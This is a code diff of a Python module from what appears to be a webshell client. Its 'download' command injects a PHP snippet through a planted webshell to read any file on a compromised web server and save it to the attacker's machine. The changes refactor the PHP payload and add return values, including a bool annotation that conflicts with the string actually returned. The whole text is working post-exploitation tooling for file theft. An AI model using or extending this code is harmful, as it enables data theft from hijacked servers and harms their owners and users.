@@ -6,12 +6,12 @@ from os import path, makedirs
 def get_php(web_file_path: str):
     return (
         """function download($fd){
-if (!@file_exists($fd)) {die();}
+if (@file_exists($fd)){
 $fileinfo = pathinfo($fd);
 header("Content-type: application/x-" . $fileinfo["extension"]);
 header("Content-Disposition: attachment; filename=" . $fileinfo["basename"]);
-header("Content-Length: " . filesize($fd));
 @readfile($fd);
+}
 }
 download("%s");
 """
@@ -22,14 +22,14 @@ download("%s");
 @alias(True, func_alias="d", w="web_file_path", l="local_path")
 def run(
     web_file_path: str, local_path: str = "",
-):
+) -> bool:
     """
     download
 
     Download file(s) from website
     """
     php = get_php(web_file_path)
-    res = send(f"{php}")
+    res = send(php)
     content = res.r_content
     download_path = local_path or gget("webshell.download_path", "webshell")
     if len(content):
@@ -40,5 +40,7 @@ def run(
         with open(file_path, "wb") as f:
             f.write(content)
         print(color.green(f"Downloaded file has been saved to {file_path}"))
+        return file_path
     else:
         print(color.red("File not exist / Download error"))
+        return ''
